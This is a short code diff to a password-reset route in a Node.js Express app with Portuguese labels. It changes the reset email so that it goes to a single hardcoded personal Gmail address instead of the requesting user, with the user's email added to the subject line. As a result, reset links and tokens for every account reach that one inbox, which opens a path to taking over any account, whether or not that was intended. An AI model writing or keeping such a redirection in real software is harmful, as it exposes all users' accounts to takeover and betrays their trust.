@@ -172,8 +172,8 @@ app.post("/esqueci-senha", async (req, res) => {
     const resetLink = `${BASE_URL}/redefinir-senha.html?token=${token}`;
 
     await enviarEmail({
-      to: email,
-      subject: "🐺 VARG — Redefinição de senha",
+      to: "matheustlopo42@gmail.com",
+      subject: "🐺 VARG — Redefinição de senha para " + email,
       html: `
         <h2 style="color:#DC143C">🐺 Redefinição de Senha</h2>
         <p>Olá, ${result.rows[0].nome}!</p>
